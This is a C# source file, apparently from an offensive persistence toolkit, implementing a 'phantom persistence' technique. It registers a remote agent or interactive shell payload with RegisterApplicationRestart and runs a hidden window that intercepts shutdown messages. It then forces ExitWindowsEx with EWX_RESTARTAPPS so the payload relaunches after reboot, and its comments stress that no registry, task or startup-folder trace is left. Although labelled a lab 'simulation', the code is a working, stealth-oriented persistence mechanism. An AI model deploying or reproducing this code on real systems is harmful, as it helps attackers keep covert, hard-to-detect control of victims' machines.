using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using System.Reflection;

namespace Persist
{
    /// <summary>
    /// Phantom Persistence via RegisterApplicationRestart + hidden message window.
    /// Intercepts WM_QUERYENDSESSION and calls ExitWindowsEx(EWX_RESTARTAPPS)
    /// to re-launch the payload after system restart/shutdown/logoff — without
    /// any registry entry, startup folder, or scheduled task.
    /// </summary>
    public class PhantomPersist : Persistence
    {
        // ------------------------------------------------------------------ //
        //  Win32 P/Invoke declarations                                        //
        // ------------------------------------------------------------------ //

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern int RegisterApplicationRestart(
            [MarshalAs(UnmanagedType.LPWStr)] string? pwzCommandLine,
            uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr GetModuleHandle(string? lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(ConsoleCtrlDelegate? handlerRoutine, bool add);

        // dwFlags for RegisterApplicationRestart
        private const uint RESTART_NO_CRASH    = 0x1;
        private const uint RESTART_NO_HANG     = 0x2;
        private const uint RESTART_NO_PATCH    = 0x4;
        private const uint RESTART_NO_REBOOT   = 0x8;

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern ushort RegisterClassEx([In] ref WNDCLASSEX lpwcx);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateWindowEx(
            uint dwExStyle, string lpClassName, string lpWindowName,
            uint dwStyle, int x, int y, int nWidth, int nHeight,
            IntPtr hWndParent, IntPtr hMenu, IntPtr hInstance, IntPtr lpParam);

        [DllImport("user32.dll")]
        private static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll")]
        private static extern bool TranslateMessage([In] ref MSG lpMsg);

        [DllImport("user32.dll")]
        private static extern IntPtr DispatchMessage([In] ref MSG lpmsg);

        [DllImport("user32.dll")]
        private static extern IntPtr DefWindowProc(IntPtr hWnd, uint uMsg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool PostQuitMessage(int nExitCode);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool ShutdownBlockReasonCreate(IntPtr hWnd,
            [MarshalAs(UnmanagedType.LPWStr)] string pwszReason);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool ShutdownBlockReasonDestroy(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetProcessShutdownParameters(uint dwLevel, uint dwFlags);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool AbortSystemShutdown(string? lpMachineName);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState, uint BufferLength,
            IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        // ------------------------------------------------------------------ //
        //  Win32 structures                                                   //
        // ------------------------------------------------------------------ //

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct WNDCLASSEX
        {
            public uint      cbSize;
            public uint      style;
            public IntPtr    lpfnWndProc;
            public int       cbClsExtra;
            public int       cbWndExtra;
            public IntPtr    hInstance;
            public IntPtr    hIcon;
            public IntPtr    hCursor;
            public IntPtr    hbrBackground;
            public string    lpszMenuName;
            public string    lpszClassName;
            public IntPtr    hIconSm;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint   message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint   time;
            public int    ptX, ptY;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint              PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        // Window messages
        private const uint WM_QUERYENDSESSION = 0x0011;
        private const uint WM_ENDSESSION      = 0x0016;
        private const uint WM_DESTROY         = 0x0002;

        // Console control events
        private const uint CTRL_LOGOFF_EVENT  = 5;
        private const uint CTRL_SHUTDOWN_EVENT = 6;

        // Window styles (hidden top-level window)
        private const uint WS_OVERLAPPEDWINDOW = 0x00CF0000;
        private const uint WS_DISABLED         = 0x08000000;

        // ExitWindowsEx flags
        private const uint EWX_RESTARTAPPS = 0x0040;
        private const uint EWX_FORCE       = 0x0004;

        // Shutdown reason
        private const uint SHTDN_REASON_MAJOR_OTHER = 0x00000000;
        private const uint SHTDN_REASON_MINOR_OTHER = 0x00000000;

        // AdjustTokenPrivileges
        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint TOKEN_QUERY             = 0x0008;
        private const uint SE_PRIVILEGE_ENABLED    = 0x0002;
        private const string SE_SHUTDOWN_NAME      = "SeShutdownPrivilege";

        // SHUTDOWN_NORETRY for SetProcessShutdownParameters
        private const uint SHUTDOWN_NORETRY = 0x00000001;

        // ------------------------------------------------------------------ //
        //  Simulation store (JSON) — tracks registered scenarios              //
        // ------------------------------------------------------------------ //

        private static readonly string SimulationDirectory = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "PersistLab");

        private static readonly string SimulationStorePath = Path.Combine(
            SimulationDirectory,
            "phantom_simulation_store.json");
        private static readonly string TraceLogPath = Path.Combine(
            SimulationDirectory,
            "phantom_trace.log");

        private static readonly HashSet<string> AllowedModes = new(StringComparer.OrdinalIgnoreCase)
            { "restart", "shutdown", "logoff", "all" };

        private const string DefaultPayload = "shell_interactif.exe";
        private static ConsoleCtrlDelegate? _consoleCtrlHandler;
        private static int _restartAttemptedFromConsoleHandler;

        // ------------------------------------------------------------------ //
        //  Constructor + router                                               //
        // ------------------------------------------------------------------ //

        public PhantomPersist(
            string persistMethod, string command,  string commandArg,
            string theKey,        string theVal,   string theName,
            string filePath,      string status,   string option)
            : base(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option)
        {
            initialize(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);
        }

        public void initialize(
            string persistMethod, string command,  string commandArg,
            string theKey,        string theVal,   string theName,
            string filePath,      string status,   string option)
        {
            switch ((status ?? "").Trim().ToLowerInvariant())
            {
                case "add":    addPersistence(command, commandArg, theName, option);    break;
                case "remove": removePersistence(theName);                              break;
                case "check":  checkPersistence(command, commandArg, theName, option);  break;
                case "list":   listPersistence(theName);                                break;
                default:
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Invalid method. Must be add, remove, check or list. See help (-h).");
                    break;
            }
        }

        // ------------------------------------------------------------------ //
        //  ADD — RegisterApplicationRestart + launch hidden message window   //
        // ------------------------------------------------------------------ //

        public void addPersistence(string command, string commandArg, string scenarioName, string mode)
{
    string name       = Normalize(scenarioName);
    string trigger    = NormalizeMode(mode);
    string payload    = BuildPayload(command, commandArg);
    string restartArgs = ExtractRestartArgs(payload);
    string exePath    = ExtractExePath(payload);

    // Auto-détection du chemin si nécessaire
    if (string.IsNullOrWhiteSpace(exePath) || exePath == "shell_interactif.exe" || exePath.StartsWith("-"))
    {
        exePath = Environment.ProcessPath ?? Assembly.GetExecutingAssembly().Location;
        
        if (!string.IsNullOrWhiteSpace(exePath) && File.Exists(exePath))
        {
            Console.WriteLine($"[*] INFO: Auto-detected payload path: {exePath}");
            
            if (string.IsNullOrWhiteSpace(restartArgs))
            {
                restartArgs = Environment.CommandLine;
                int firstSpace = restartArgs.IndexOf(' ');
                if (firstSpace > 0)
                {
                    restartArgs = restartArgs.Substring(firstSpace + 1).Trim();
                }
                Console.WriteLine($"[*] INFO: Auto-detected restart args: {restartArgs}");
            }
        }
        else
        {
            Console.WriteLine("[-] ERROR: Could not auto-detect payload path");
            return;
        }
    }

    Trace($"ADD requested: scenario='{name}', mode='{trigger}'.");
    Trace($"ExePath='{exePath}'");
    Trace($"RestartArgs='{restartArgs}'");

    Console.WriteLine("");
    Console.WriteLine("[*] INFO: Adding phantom persistence");
    Console.WriteLine("[*] INFO: Scenario Name: "   + (string.IsNullOrWhiteSpace(name) ? "(none)" : name));
    Console.WriteLine("[*] INFO: Trigger Mode: "    + trigger);
    Console.WriteLine("[*] INFO: Payload Path: "    + exePath);
    Console.WriteLine("[*] INFO: Restart Args: "    + (string.IsNullOrWhiteSpace(restartArgs) ? "(empty)" : restartArgs));
    Console.WriteLine("");

    // --- Validation ---
    if (string.IsNullOrWhiteSpace(name))
    {
        Console.WriteLine("[-] ERROR: Must provide a scenario name with -n. See help (-h).");
        Trace("ADD failed: missing scenario name.");
        return;
    }
    if (!AllowedModes.Contains(trigger))
    {
        Console.WriteLine("[-] ERROR: Invalid trigger mode. Use restart, shutdown, logoff, or all.");
        Trace($"ADD failed: invalid trigger mode '{trigger}'.");
        return;
    }
    if (string.IsNullOrWhiteSpace(exePath) || !File.Exists(exePath))
    {
        Console.WriteLine($"[-] ERROR: Payload executable not found: '{exePath}'. Check -c argument.");
        Trace($"ADD failed: exe not found at '{exePath}'.");
        return;
    }

    var store = LoadStore();
    if (store.ContainsKey(name))
    {
        Console.WriteLine("[-] ERROR: Phantom scenario already exists. Remove it first.");
        Trace($"ADD blocked: scenario '{name}' already exists.");
        return;
    }

    // --- Save scenario metadata ---
    var entry = new PhantomEntry
    {
        ScenarioName     = name,
        Command          = (command    ?? "").Trim(),
        CommandArg       = (commandArg ?? "").Trim(),
        TriggerMode      = trigger,
        ExePath          = exePath,
        RestartArgs      = restartArgs,
        AddedAtUtc       = DateTime.UtcNow.ToString("o"),
        LastUpdatedAtUtc = DateTime.UtcNow.ToString("o")
    };
    store[name] = entry;
    SaveStore(store);
    Trace($"Scenario '{name}' saved in simulation store.");

    // ============================================================
    // Enregistrer l'agent NORMAL pour le restart
    // ============================================================
    Console.WriteLine("[*] INFO: Registering current agent for restart...");
    Console.WriteLine($"[*] INFO: Restart args: {restartArgs}");

    int hr = RegisterApplicationRestart(restartArgs, 0);

    if (hr != 0)
    {
        Console.WriteLine($"[-] ERROR: RegisterApplicationRestart failed: 0x{hr:X8}");
        Trace($"RegisterApplicationRestart failed: 0x{hr:X8}");
        return;
    }

    Console.WriteLine("[+] SUCCESS: Current agent registered for restart.");
    Console.WriteLine("[*] INFO: Starting message loop in BACKGROUND thread to intercept shutdown events...");
    Console.WriteLine("[*] INFO: No registry / task / startup-folder trace created.");

    // ============================================================
    // CRUCIAL : Démarrer la fenêtre cachée dans un THREAD SÉPARÉ
    // Pour ne PAS bloquer l'agent principal
    // ============================================================
    Thread messageLoopThread = new Thread(() => RunMessageLoop(""));
    messageLoopThread.IsBackground = true;
    messageLoopThread.Start();

    Console.WriteLine("[+] SUCCESS: Message loop running in background.");
    // ============================================================
}
        /// <summary>
        /// Launch MyAgent.exe with --phantom-host appended.
        /// MyAgent.exe is expected to handle this flag by self-registering with
        /// RegisterApplicationRestart and running a WM_QUERYENDSESSION message loop.
        /// </summary>
        private static bool LaunchPhantomHost(string exePath, string restartArgs, string scenarioName, string trigger)
        {
            try
            {
                string escapedRestartArgs = restartArgs.Replace("\"", "\\\"");
                string args =
                    $"--phantom-host --phantom-scenario \"{scenarioName}\" --phantom-mode \"{trigger}\" --phantom-payload-args \"{escapedRestartArgs}\"";
                Trace($"LaunchPhantomHost: exe='{exePath}' args='{args}'");

                Process? proc = Process.Start(new ProcessStartInfo
                {
                    FileName        = exePath,
                    Arguments       = args,
                    UseShellExecute = false,
                    CreateNoWindow  = true
                });

                if (proc == null) { Trace("LaunchPhantomHost: Process.Start returned null."); return false; }
                Trace($"LaunchPhantomHost: PID={proc.Id}.");
                Console.WriteLine($"[*] INFO: Phantom host PID: {proc.Id}");
                return true;
            }
            catch (Exception ex)
            {
                Trace($"LaunchPhantomHost exception: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Fallback: look for a pre-built PhantomHost.exe sidecar next to Persist.exe
        /// or MyAgent.exe. PhantomHost.exe accepts:
        ///   --target "path\MyAgent.exe" --args "..." --trigger restart --scenario name
        /// It calls RegisterApplicationRestart on MyAgent.exe via CreateProcess + injection,
        /// or simply runs MyAgent.exe and the message loop itself.
        /// </summary>
        private static bool LaunchPhantomSideCar(string exePath, string restartArgs, string scenarioName, string trigger)
        {
            try
            {
                string persistDir = AppContext.BaseDirectory;
                string agentDir   = Path.GetDirectoryName(exePath) ?? "";

                string? sidecar = null;
                foreach (string dir in new[] { persistDir, agentDir })
                {
                    string candidate = Path.Combine(dir, "PhantomHost.exe");
                    if (File.Exists(candidate)) { sidecar = candidate; break; }
                }

                if (sidecar == null)
                {
                    Trace("LaunchPhantomSideCar: PhantomHost.exe not found.");
                    return false;
                }

                string escapedArgs = restartArgs.Replace("\"", "\\\"");
                string sidecarArgs = $"--target \"{exePath}\" --args \"{escapedArgs}\" --trigger \"{trigger}\" --scenario \"{scenarioName}\"";
                Trace($"LaunchPhantomSideCar: sidecar='{sidecar}' args='{sidecarArgs}'");

                Process? proc = Process.Start(new ProcessStartInfo
                {
                    FileName        = sidecar,
                    Arguments       = sidecarArgs,
                    UseShellExecute = false,
                    CreateNoWindow  = true
                });

                if (proc == null) { Trace("LaunchPhantomSideCar: Process.Start returned null."); return false; }
                Trace($"LaunchPhantomSideCar: PID={proc.Id}.");
                Console.WriteLine($"[*] INFO: PhantomHost sidecar PID: {proc.Id}");
                return true;
            }
            catch (Exception ex)
            {
                Trace($"LaunchPhantomSideCar exception: {ex.Message}");
                return false;
            }
        }

        // ------------------------------------------------------------------ //
        //  REMOVE — Unregister restart + delete store entry                  //
        // ------------------------------------------------------------------ //

        public void removePersistence(string scenarioName)
        {
            string name = Normalize(scenarioName);
            Trace($"REMOVE requested: scenario='{name}'.");

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Removing phantom persistence");

            if (string.IsNullOrWhiteSpace(name))
            {
                Console.WriteLine("[-] ERROR: Must provide a scenario name with -n. See help (-h).");
                Trace("REMOVE failed: missing scenario name.");
                return;
            }

            var store = LoadStore();
            if (!store.ContainsKey(name))
            {
                Console.WriteLine("[-] ERROR: Phantom scenario does not exist.");
                Trace($"REMOVE failed: scenario '{name}' not found.");
                return;
            }

            // Unregister: passing RESTART_NO_REBOOT | RESTART_NO_RESTART (0x8) clears the registration
            int hr = RegisterApplicationRestart(null, RESTART_NO_REBOOT);
            if (hr != 0)
            {
                Console.WriteLine($"[!] WARN: RegisterApplicationRestart unregister returned 0x{hr:X8} (may already be cleared).");
                Trace($"Unregister warning: hr=0x{hr:X8}.");
            }
            else
            {
                Trace("RegisterApplicationRestart unregistered successfully.");
            }

            store.Remove(name);
            SaveStore(store);

            Console.WriteLine("[+] SUCCESS: Phantom persistence removed.");
            Console.WriteLine("[*] INFO: Scenario Name: " + name);
            Trace($"Scenario '{name}' removed.");
        }

        // ------------------------------------------------------------------ //
        //  CHECK — Validate args and detect duplicate scenario               //
        // ------------------------------------------------------------------ //

        public void checkPersistence(string command, string commandArg, string scenarioName, string option)
        {
            string name    = Normalize(scenarioName);
            string trigger = NormalizeMode(option);

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking phantom persistence arguments.");

            if (string.IsNullOrWhiteSpace(name))
            {
                Console.WriteLine("[-] ERROR: Scenario name is required (-n). See help (-h).");
                return;
            }

            if (!AllowedModes.Contains(trigger))
            {
                Console.WriteLine("[-] ERROR: Invalid trigger mode (-o). Allowed: restart, shutdown, logoff, all.");
                return;
            }

            var store  = LoadStore();
            bool exists = store.ContainsKey(name);

            Console.WriteLine(exists
                ? "[-] ERROR: Scenario name already exists — it would be blocked on add."
                : "[+] SUCCESS: Scenario name is available.");

            Console.WriteLine("[+] SUCCESS: Arguments are valid for phantom simulation.");
            Console.WriteLine("[*] INFO: Payload: " + BuildPayload(command, commandArg));
            Console.WriteLine("[*] INFO: Trigger: " + trigger);
        }

        // ------------------------------------------------------------------ //
        //  LIST — Display stored scenarios                                   //
        // ------------------------------------------------------------------ //

        public void listPersistence(string scenarioName)
        {
            var    store = LoadStore();
            string name  = Normalize(scenarioName);

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Listing phantom simulation scenarios.");

            if (!string.IsNullOrWhiteSpace(name))
            {
                if (!store.TryGetValue(name, out PhantomEntry single))
                {
                    Console.WriteLine("[-] ERROR: Scenario not found.");
                    return;
                }
                PrintEntry(single);
                return;
            }

            if (store.Count == 0)
            {
                Console.WriteLine("[*] INFO: No phantom simulation scenarios found.");
                return;
            }

            foreach (PhantomEntry entry in store.Values)
                PrintEntry(entry);
        }

        // ------------------------------------------------------------------ //
        //  Hidden message-loop window (Win32 window procedure)               //
        // ------------------------------------------------------------------ //

        /// <summary>
        /// Runs a hidden HWND_MESSAGE window on the calling thread.
        /// Intercepts WM_QUERYENDSESSION: enables SeShutdownPrivilege,
        /// then calls ExitWindowsEx(EWX_RESTARTAPPS|EWX_FORCE) so Windows
        /// relaunches the payload after reboot.
        /// </summary>
        private static void RunMessageLoop(string payloadHint)
        {
            const string ClassName = "PhantomPersist_MsgWindow";
            Trace("RunMessageLoop entered.");

            WndProcDelegate wndProc = (hWnd, msg, wParam, lParam) =>
            {
                switch (msg)
                {
                    case WM_QUERYENDSESSION:
                        Trace("WM_QUERYENDSESSION received.");
                        // Block shutdown briefly to let ExitWindowsEx fire first.
                        ShutdownBlockReasonCreate(hWnd, "PhantomPersist: scheduling EWX_RESTARTAPPS...");
                        EnableShutdownPrivilege();
                        // NOTE: Do NOT call AbortSystemShutdown here — it conflicts with
                        // EWX_RESTARTAPPS and prevents the restart from happening.
                        if (!ExitWindowsEx(EWX_RESTARTAPPS | EWX_FORCE,
                                SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER))
                        {
                            Trace($"ExitWindowsEx failed: win32={Marshal.GetLastWin32Error()}.");
                        }
                        else
                        {
                            Trace("ExitWindowsEx(EWX_RESTARTAPPS|EWX_FORCE) called successfully.");
                        }
                        ShutdownBlockReasonDestroy(hWnd);
                        return (IntPtr)1; // TRUE → allow session end

                    case WM_ENDSESSION:
                        ShutdownBlockReasonDestroy(hWnd);
                        Trace("WM_ENDSESSION received.");
                        return IntPtr.Zero;

                    case WM_DESTROY:
                        PostQuitMessage(0);
                        Trace("WM_DESTROY received.");
                        return IntPtr.Zero;

                    default:
                        return DefWindowProc(hWnd, msg, wParam, lParam);
                }
            };

            // Use proper HINSTANCE for window class/creation.
            IntPtr hInstance = GetModuleHandle(null);

            WNDCLASSEX wcex = new WNDCLASSEX
            {
                cbSize        = (uint)Marshal.SizeOf<WNDCLASSEX>(),
                style         = 0,
                lpfnWndProc   = Marshal.GetFunctionPointerForDelegate(wndProc),
                hInstance     = hInstance,
                lpszClassName = ClassName
            };

            if (RegisterClassEx(ref wcex) == 0)
            {
                Console.WriteLine($"[!] WARN: RegisterClassEx failed ({Marshal.GetLastWin32Error()}).");
                Trace($"RegisterClassEx failed: win32={Marshal.GetLastWin32Error()}.");
                return;
            }
            Trace("RegisterClassEx succeeded.");

            // IMPORTANT:
            // Message-only windows (HWND_MESSAGE / parent = -3) do NOT receive broadcast shutdown messages
            // like WM_QUERYENDSESSION / WM_ENDSESSION. Use a hidden top-level window instead.
            IntPtr hWndMsg = CreateWindowEx(
                0,
                ClassName,
                "",
                WS_OVERLAPPEDWINDOW | WS_DISABLED,
                0,
                0,
                0,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                hInstance,
                IntPtr.Zero
            );

            if (hWndMsg == IntPtr.Zero)
            {
                Console.WriteLine($"[!] WARN: CreateWindowEx failed ({Marshal.GetLastWin32Error()}).");
                Trace($"CreateWindowEx failed: win32={Marshal.GetLastWin32Error()}.");
                return;
            }
            Trace("CreateWindowEx succeeded (hidden top-level window created).");

            // Set highest possible shutdown level so we run last and can redirect
// if (!SetProcessShutdownParameters(0x4FF, SHUTDOWN_NORETRY))
// {
//     if (!SetProcessShutdownParameters(0x400, SHUTDOWN_NORETRY))
//     {
//         SetProcessShutdownParameters(0x3FF, SHUTDOWN_NORETRY);
//     }
// }
// Trace("SetProcessShutdownParameters configured.");

// Remplacer par :
Trace("SetProcessShutdownParameters skipped (optional).");

            // Standard Win32 message pump
            while (GetMessage(out MSG msg, IntPtr.Zero, 0, 0))
            {
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }
            Trace("Message loop exited.");

            GC.KeepAlive(wndProc); // prevent delegate GC while loop is running
        }

        private static void EnsureConsoleShutdownHook()
        {
            if (_consoleCtrlHandler is not null)
            {
                Trace("Console shutdown hook already installed.");
                return;
            }

            _consoleCtrlHandler = (ctrlType) =>
            {
                if (ctrlType == CTRL_SHUTDOWN_EVENT || ctrlType == CTRL_LOGOFF_EVENT)
                {
                    Trace($"Console shutdown event received: type={ctrlType}.");
                    TryTriggerRestartApps("console_ctrl");
                    return false; // allow normal shutdown flow to continue
                }
                return false;
            };

            bool ok = SetConsoleCtrlHandler(_consoleCtrlHandler, true);
            if (!ok)
            {
                Trace($"SetConsoleCtrlHandler failed: win32={Marshal.GetLastWin32Error()}.");
            }
            else
            {
                Trace("SetConsoleCtrlHandler installed successfully.");
            }
        }

        private static void TryTriggerRestartApps(string source)
        {
            if (Interlocked.Exchange(ref _restartAttemptedFromConsoleHandler, 1) != 0)
            {
                Trace($"TryTriggerRestartApps ignored (already attempted), source={source}.");
                return;
            }

            // NOTE: No AbortSystemShutdown — it conflicts with EWX_RESTARTAPPS.
            EnableShutdownPrivilege();
            if (!ExitWindowsEx(EWX_RESTARTAPPS | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER))
                Trace($"TryTriggerRestartApps failed from {source}: win32={Marshal.GetLastWin32Error()}.");
            else
                Trace($"TryTriggerRestartApps succeeded from {source}.");
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr WndProcDelegate(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);
        private delegate bool ConsoleCtrlDelegate(uint ctrlType);

        // ------------------------------------------------------------------ //
        //  Enable SeShutdownPrivilege for ExitWindowsEx                      //
        // ------------------------------------------------------------------ //

        private static void EnableShutdownPrivilege()
        {
            if (!OpenProcessToken(GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out IntPtr hToken))
            {
                Trace($"EnableShutdownPrivilege failed: OpenProcessToken win32={Marshal.GetLastWin32Error()}.");
                return;
            }

            try
            {
                if (!LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, out LUID luid))
                {
                    Trace($"EnableShutdownPrivilege failed: LookupPrivilegeValue win32={Marshal.GetLastWin32Error()}.");
                    return;
                }

                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges     = new LUID_AND_ATTRIBUTES
                    {
                        Luid       = luid,
                        Attributes = SE_PRIVILEGE_ENABLED
                    }
                };

                AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                Trace("EnableShutdownPrivilege: AdjustTokenPrivileges called.");
            }
            finally
            {
                CloseHandle(hToken);
            }
        }

        // ------------------------------------------------------------------ //
        //  Immediate payload execution (same pattern as other techniques)    //
        // ------------------------------------------------------------------ //

        private static void ExecutePersistencePayload(string command, string commandArg)
        {
            string payload = BuildPayload(command, commandArg);
            if (string.IsNullOrWhiteSpace(payload))
                return;

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName  = "cmd.exe",
                    Arguments = $"/c start \"\" {payload}",
                    UseShellExecute  = false,
                    CreateNoWindow   = true
                });
                Console.WriteLine("[*] INFO: Persistence payload launched immediately.");
                Trace("Immediate payload launch succeeded.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] WARN: Persistence was added but immediate launch failed: {ex.Message}");
                Trace($"Immediate payload launch failed: {ex.Message}");
            }
        }

        // ------------------------------------------------------------------ //
        //  JSON store helpers                                                 //
        // ------------------------------------------------------------------ //

        private static Dictionary<string, PhantomEntry> LoadStore()
        {
            try
            {
                if (!File.Exists(SimulationStorePath))
                    return new Dictionary<string, PhantomEntry>(StringComparer.OrdinalIgnoreCase);

                string raw = File.ReadAllText(SimulationStorePath);
                if (string.IsNullOrWhiteSpace(raw))
                    return new Dictionary<string, PhantomEntry>(StringComparer.OrdinalIgnoreCase);

                return JsonSerializer.Deserialize<Dictionary<string, PhantomEntry>>(raw)
                    ?? new Dictionary<string, PhantomEntry>(StringComparer.OrdinalIgnoreCase);
            }
            catch
            {
                return new Dictionary<string, PhantomEntry>(StringComparer.OrdinalIgnoreCase);
            }
        }

        private static void SaveStore(Dictionary<string, PhantomEntry> store)
        {
            Directory.CreateDirectory(SimulationDirectory);
            File.WriteAllText(SimulationStorePath,
                JsonSerializer.Serialize(store, new JsonSerializerOptions { WriteIndented = true }));
        }

        // ------------------------------------------------------------------ //
        //  Helpers                                                            //
        // ------------------------------------------------------------------ //

        private static string Normalize(string value)     => (value ?? "").Trim();
        private static string NormalizeMode(string value)
        {
            string m = (value ?? "").Trim().ToLowerInvariant();
            return string.IsNullOrWhiteSpace(m) ? "all" : m;
        }

        private static string BuildPayload(string command, string commandArg)
        {
            string merged = $"{command} {commandArg}".Trim();
            return string.IsNullOrWhiteSpace(merged) ? DefaultPayload : merged;
        }

        /// <summary>
        /// Extracts just the executable path from a full command line.
        /// e.g. "C:\path\MyAgent.exe" --arg1 → "C:\path\MyAgent.exe"
        /// </summary>
        private static string ExtractExePath(string payloadCommandLine)
        {
            string s = (payloadCommandLine ?? "").Trim();
            if (string.IsNullOrWhiteSpace(s)) return "";

            // Quoted path: "C:\path\exe.exe" args...
            if (s.StartsWith("\"", StringComparison.Ordinal))
            {
                int endQuote = s.IndexOf('"', 1);
                return endQuote > 0 ? s[1..endQuote] : "";
            }

            // Unquoted: first token is the exe
            int space = s.IndexOf(' ');
            return space < 0 ? s : s[..space];
        }

        /// <summary>
        /// Given a full command line like:
        ///   "C:\Path\MyAgent.exe" --shell-only --server http://... --listener ...
        /// return only the arguments portion that RegisterApplicationRestart expects:
        ///   --shell-only --server http://... --listener ...
        /// </summary>
        private static string ExtractRestartArgs(string payloadCommandLine)
        {
            string s = (payloadCommandLine ?? "").Trim();
            if (string.IsNullOrWhiteSpace(s))
                return "";

            // If it starts with a quote, skip the quoted executable path.
            if (s.StartsWith("\"", StringComparison.Ordinal))
            {
                int endQuote = s.IndexOf('"', 1);
                if (endQuote <= 0)
                    return "";

                string rest = s[(endQuote + 1)..].Trim();
                return rest;
            }

            // Otherwise, skip the first token (assumed executable path).
            int firstSpace = s.IndexOf(' ');
            if (firstSpace < 0)
                return "";

            return s[(firstSpace + 1)..].Trim();
        }

        private static void Trace(string message)
        {
            try
            {
                Directory.CreateDirectory(SimulationDirectory);
                string line = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] {message}{Environment.NewLine}";
                File.AppendAllText(TraceLogPath, line);
            }
            catch
            {
                // Never fail persistence flow due to trace I/O issues.
            }
        }

        private static void PrintEntry(PhantomEntry e)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: SCENARIO NAME:");
            Console.WriteLine(e.ScenarioName);
            Console.WriteLine("[*] INFO: TRIGGER MODE:");
            Console.WriteLine(e.TriggerMode);
            Console.WriteLine("[*] INFO: PAYLOAD:");
            Console.WriteLine(BuildPayload(e.Command, e.CommandArg));
            Console.WriteLine("[*] INFO: ADDED (UTC):");
            Console.WriteLine(e.AddedAtUtc);
            Console.WriteLine("[*] INFO: LAST UPDATED (UTC):");
            Console.WriteLine(e.LastUpdatedAtUtc);
        }

        // ------------------------------------------------------------------ //
        //  Data model                                                         //
        // ------------------------------------------------------------------ //

        private sealed class PhantomEntry
        {
            public string ScenarioName      { get; set; } = "";
            public string Command           { get; set; } = "";
            public string CommandArg        { get; set; } = "";
            public string TriggerMode       { get; set; } = "all";
            public string ExePath           { get; set; } = "";   // path to MyAgent.exe
            public string RestartArgs       { get; set; } = "";   // args passed to RegisterApplicationRestart
            public string AddedAtUtc        { get; set; } = "";
            public string LastUpdatedAtUtc  { get; set; } = "";
        }
    }
}